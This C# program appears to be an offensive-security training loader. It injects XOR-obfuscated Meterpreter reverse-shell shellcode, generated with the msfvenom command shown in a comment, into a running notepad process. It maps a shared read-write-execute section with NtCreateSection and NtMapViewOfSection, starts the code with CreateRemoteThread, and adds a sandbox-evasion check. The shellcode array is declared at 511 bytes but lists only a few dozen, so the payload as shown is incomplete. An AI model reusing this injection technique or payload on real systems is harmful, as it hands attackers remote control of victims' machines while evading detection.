using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace RemoteShinjectLowlevel
{
    class Program
    {
        public const uint ProcessAllFlags = 0x001F0FFF;
        public const uint GenericAll = 0x10000000;
        public const uint PageReadWrite = 0x04;
        public const uint PageReadExecute = 0x20;
        public const uint PageReadWriteExecute = 0x40;
        public const uint SecCommit = 0x08000000;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);


        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize,
            UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize,
            out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            // Sandbox evasion
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
            // XORed with key 0xfa
            byte[] buf = new byte[511] {
            0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
            0x05, 0x05, 0x05, 0xb2, 0xfb, 0x39, 0xb2, 0xd3, 0x3c, 0xb2, 0x7f, 0x0c, 0x8f, 0x4e, 0xbb,
            0x05, 0x1d, 0xa2, 0x90, 0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05,
            0x2f
            };

            int len = buf.Length;
            uint uLen = (uint)len;

            // Get a handle on the local process
            IntPtr lHandle = Process.GetCurrentProcess().Handle;
            Console.WriteLine($"Got handle {lHandle} on local process.");

            // Grab the right PID
            //change :)
            string targetedProc = "notepad"; // I'm sure it won't work if notepad is not open
            int procId = Process.GetProcessesByName(targetedProc).First().Id;

            // Get a handle on the remote process
            IntPtr pHandle = OpenProcess(ProcessAllFlags, false, procId);
            Console.WriteLine($"Got handle {pHandle} on PID {procId} ({targetedProc}).");

            // Create a RWX memory section with the size of the payload using 'NtCreateSection'
            IntPtr sHandle = new IntPtr();
            long cStatus = NtCreateSection(ref sHandle, GenericAll, IntPtr.Zero, ref uLen, PageReadWriteExecute, SecCommit, IntPtr.Zero);
            Console.WriteLine($"Created new shared memory section with handle {sHandle}. Success: {cStatus == 0}.");

            // Map a view of the created section (sHandle) for the LOCAL process using 'NtMapViewOfSection'
            IntPtr baseAddrL = new IntPtr();
            uint viewSizeL = uLen;
            ulong sectionOffsetL = new ulong();
            long mStatusL = NtMapViewOfSection(sHandle, lHandle, ref baseAddrL, IntPtr.Zero, IntPtr.Zero, out sectionOffsetL, out viewSizeL, 2, 0, PageReadWrite);
            Console.WriteLine($"Mapped local memory section with base address {baseAddrL} (viewsize: {viewSizeL}, offset: {sectionOffsetL}). Success: {mStatusL == 0}.");

            // Map a view of the same section for the specified REMOTE process (pHandle) using 'NtMapViewOfSection'
            IntPtr baseAddrR = new IntPtr();
            uint viewSizeR = uLen;
            ulong sectionOffsetR = new ulong();
            long mStatusR = NtMapViewOfSection(sHandle, pHandle, ref baseAddrR, IntPtr.Zero, IntPtr.Zero, out sectionOffsetR, out viewSizeR, 2, 0, PageReadExecute);
            Console.WriteLine($"Mapped remote memory section with base address {baseAddrR} (viewsize: {viewSizeR}, offset: {sectionOffsetR}). Success: {mStatusR == 0}.");

            // Decode shellcode
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            // Copy shellcode to locally mapped view, which will be reflected in the remote mapping
            Marshal.Copy(buf, 0, baseAddrL, len);
            Console.WriteLine($"Copied shellcode to locally mapped memory at address {baseAddrL}.");

            // Execute the remotely mapped memory using 'CreateRemoteThread' (EWWW high-level APIs!!!)
            if (CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddrR, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
            {
                Console.WriteLine("Injection done! Check your listener!");
            }
            else
            {
                Console.WriteLine("Injection failed!");
            }

            // Unmap the locally mapped section view using 'NtUnMapViewOfSection'
            uint uStatusL = NtUnmapViewOfSection(lHandle, baseAddrL);
            Console.WriteLine($"Unmapped local memory section. Success: {uStatusL == 0}.");

            // Close the section
            int clStatus = NtClose(sHandle);
            Console.WriteLine($"Closed memory section. Success: {clStatus == 0}.");
        }
    }
}
